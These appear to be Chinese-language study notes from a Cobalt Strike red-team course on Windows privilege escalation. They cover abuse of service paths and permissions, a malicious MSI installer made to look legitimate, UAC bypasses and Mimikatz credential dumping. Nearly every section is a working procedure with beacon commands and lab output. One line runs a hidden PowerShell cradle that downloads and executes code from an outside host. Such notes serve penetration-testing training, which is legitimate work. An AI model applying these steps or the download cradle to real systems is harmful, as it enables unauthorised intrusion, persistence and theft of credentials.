# Host Privilege Escalation

主机特权提升

主机提权提升对于横向来说不是必须的。

提权的好处是可以使用 Mimikatz 转储凭据，操作主机持久性，以及修改防火墙等配置

提权的坏处是，可能会暴露你自己。

最小权限原则：
特权提升的前提是，可以实现特定的目标，但是会增加暴露自己（被检测到）的风险，是否提权需要权衡。

工具：
[SharpUp](https://github.com/GhostPack/SharpUp)

C#版本的 PowerUp

# Web Proxies

web 代理作为客户端和目标web服务器之间的中介，因为下面几个原因常常部署到线上

## Filtering & Monitoring （过滤和监控）
阻止浏览某些网站
中央日志
监控/报告员工浏览习惯
SSL offloading甚至可以检查HTTPS流量

## Performance （性能）
缓存静态资源

## Security（安全）
上面的过滤和监控有安全优势，可以阻止恶意网站的访问和下载某些文件类型的能力
web代理还可以安装AV，对传输中的文件进行扫描
如果记录了所有出站请求，则还会记录HTTP流量
很多Active Directory 集成以进行用户身份验证并创建灵活的 Web 访问策略，阻止敏感账号的访问（DA和机器账号）



代理设置通常通过 GPO 部署并写入注册表，手动枚举
```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe InternetSettings

  HKCU                       ProxyEnable : 1
  HKCU                     ProxyOverride : ;local
  HKCU                       ProxyServer : squid.dev.cyberbotic.io:3128
```


通过代理添加的其他header，例如X-Forwarded-For判断是否启用了web代理
```
root@kali:~# tshark -i eth0 -f "tcp port 80" -O http -Y "http.request"
[...snip...]

Accept: */*\r\n
    User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322)\r\n
    Pragma: no-cache\r\n
    Host: 10.10.5.120\r\n
    Via: 1.1 squid.dev.cyberbotic.io (squid/5.2)\r\n
    X-Forwarded-For: 10.10.17.231\r\n
    Cache-Control: max-age=0\r\n
    Connection: keep-alive\r\n
    \r\n
```

# Peer-to-Peer Listeners
p2p监听

Cobalt Strike 中的 P2P 类型是TCP和SMB

当涉及到 pivoting, privilege escalation和任何其他需要生成额外 Beacon payload的情况时，链接 Beacon 尤其有用。它们有助于将与您的攻击基础设施的直接出站连接数量保持在较低水平

在Listeners菜单中创建 P2P 侦听器，方法是选择TCP或SMB Beacon 有效负载类型

也可以从“Attacks”菜单以相同的方式生成：spawn, spawnas, inject and jump


# Windows Services
Windows服务

查询

cmd下
```
sc query [服务名称]
```

powershelll下
```
Get-Service | fl
```


服务属性中，下面几个尤其需要注意

## Binary Path
服务的二进制文件路径

windows本身的服务放在：```C:\Windows\system32```
第三方服务：```C:\Program Files / C:\Program Files (x86)```

## Startup Type
启动类型

> Automatic - The service starts immediately on boot.
> Automatic (Delayed Start) - The service waits a short amount of time after boot before starting (mostly a legacy option to help the desktop load faster).
> Manual - The service will only start when specifically asked.
> Disabled - The service is disabled and won't run.

## Service Status
服务状态

> Running - The service is running.
> Stopped - The service is not running.
> StartPending - The service has been asked to start and is executing its startup procedure.
> StopPending - The service has been asked to stop and is executing its shutdown procedure.


## Log On As
登录身份

这可以是域或本地帐户。这些服务作为高特权帐户、甚至域管理员或本地系统运行是很常见的。这就是为什么服务可以成为本地和域权限提升的有吸引力的目标。

## Dependants & Dependencies
依赖与被依赖

通过依赖关系知道哪些exe文件可以被利用，前提是需要有重启服务的权限（或者重启系统）


# Unquoted Service Paths

未加引号的服务路径

原理：OSCP已经学过，不赘述

查询命令，使用wmic
```
run wmic service get name, pathname
```

利用条件：
1. 存在未加引号的服务路径
2. 对相应文件夹有写入权限

查询文件是否有写入权限，使用powershell,```f1```参数表示格式化输出
```
powershell Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```

Cobalt Strike生成payload
```
Attacks > Packages > Windows Executable (S) and selecting the Service Binary output type.
```

# Weak Service Permissions
弱服务权限

枚举提权漏洞
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
```

显示Service 2.exe Modifiable
```
=== Modifiable Services ===

  Name             : Vuln-Service-2
  DisplayName      : Vuln-Service-2
  Description      : 
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files\Vuln Services\Service 2.exe"
```

用[这个PS脚本](https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/)查看对上面程序的具体权限
```
beacon> powershell-import C:\Tools\Get-ServiceAcl.ps1
beacon> powershell Get-ServiceAcl -Name Vuln-Service-2 | select -expandproperty Access

ServiceRights     : ChangeConfig, Start, Stop
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\Authenticated Users
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None
```

显示有ChangeConfig, Start, Stop权限

准备一个payload放在```C:\Temp\fake-service.exe```

编辑指定上面服务的config二进制文件
```
beacon> run sc config Vuln-Service-2 binPath= C:\Temp\fake-service.exe
[SC] ChangeServiceConfig SUCCESS
```

重启服务
```
beacon> run sc stop Vuln-Service-2
beacon> run sc start Vuln-Service-2
```

连接shell
```
beacon> connect localhost 4444
[+] established link to child beacon: 10.10.17.231
```

# Weak Service Binary Permissions

直接替换服务的exe程序进行提权

```
powershell Get-Acl -Path "C:\Program Files\Vuln Services\Service 3.exe" | fl
```


使用```net helpmsg```命令查看报错信息
```
C:\>net helpmsg 32
The process cannot access the file because it is being used by another process.
```

先停止程序，再替换，最后重启生效
```
beacon> run sc stop Vuln-Service-3
beacon> upload C:\Payloads\Service 3.exe
beacon> ls
[*] Listing: C:\Program Files\Vuln Services\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 282kb    fil     03/03/2021 11:38:24   Service 3.exe

beacon> run sc start Vuln-Service-3
beacon> connect localhost 4444
[+] established link to child beacon: 10.10.17.231
```

# Always Install Elevated

下面两个值如果都是1，表示拥有以``` NT AUTHORITY\SYSTEM```身份运行或者安装```*.msi```文件的权限
```
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe

=== AlwaysInstallElevated Registry Keys ===

  HKLM:    1
  HKCU:    1
```

制作msi程序

1. Generate a new Windows EXE TCP payload and save it to C:\Payloads\beacon-tcp.exe.
2. Open Visual Studio, select Create a new project and type "installer" into the search box. Select the Setup Wizard project and click Next.
3. Give the project a name, like BeaconInstaller, use C:\Payloads for the location, select place solution and project in the same directory, and click Create.
4. Keep clicking Next until you get to step 3 of 4 (choose files to include). Click Add and select the Beacon payload you just generated. Then click Finish.
5. Highlight the BeaconInstaller project in the Solution Explorer and in the Properties, change TargetPlatform from x86 to x64.

最终安装此 MSI 时，它将显示为目标上的已安装程序。

您可以更改其他属性，例如作者和制造商，它们可以使安装的应用程序看起来更合法。

1. 右键单击项目并选择View > Custom Actions。
2. 右键单击安装并选择添加自定义操作。
3. 双击Application Folder，选择您的beacon-tcp.exe文件，然后单击OK。这将确保在安装程序运行后立即执行信标有效负载。
4. 在自定义操作属性下，将Run64Bit更改为True。



上传并运行
```
beacon> cd C:\Temp
beacon> upload C:\Payloads\BeaconInstaller\Debug\BeaconInstaller.msi
beacon> run msiexec /i BeaconInstaller.msi /q /n
beacon> connect localhost 4444
[+] established link to child beacon: 10.10.17.231
```

# UAC Bypasses

UAC绕过

下面命令查询程序是否启用的UAC
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe uac
```

UAC 绕过是一种技术，通过该技术，应用程序可以在不提示同意的情况下从 Medium转到High Integrity

下面命令告知，当前账号是Medium状态的管理员，可以提升到High Integrity（完全管理员权限）
```
beacon> getuid
[*] You are DEV\nlamb

beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe

=== SharpUp: Running Privilege Escalation Checks ===

[*] In medium integrity but user is a local administrator- UAC can be bypassed.
```

Cobalt Strike 提供了两种执行代码的方法来绕过 UAC。第一种是通过elevate命令，它通过所选技术引导侦听器。第二种是通过runasadmin命令，它允许您执行任意命令

elevate
```
beacon> elevate uac-token-duplication tcp-4444-local
[+] Success! Used token from PID 480
[+] established link to child beacon: 10.10.17.132
```


runasadmin
```
beacon> runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```


并非所有的 UAC 绕过都是一样的

```TokenPrivileges```命令可以列举当前token特权

使用 Token Duplication 获得的高完整性会话如下所示：

```
====== TokenPrivileges ======

Current Token's Privileges

                          SeShutdownPrivilege:  DISABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                            SeUndockPrivilege:  DISABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED
                          SeTimeZonePrivilege:  DISABLED
```

此时我们使用```logonpasswords```导出哈希仍然会提示没有权限
```
beacon> logonpasswords
[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[+] host called home, sent: 296058 bytes
[+] received output:
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

这种情况下，即使我们是在high integrity session下，我们也无法绕过UAC。但是可以使用```elevate svc-exe```通过使用服务控制管理器以 SYSTEM 身份执行另一个 Beacon
```
beacon> elevate svc-exe tcp-4444-local
Started service 96d0481 on .
[+] established link to child beacon: 10.10.17.132
```

上面beacon的权限可以使用```logonpasswords```命令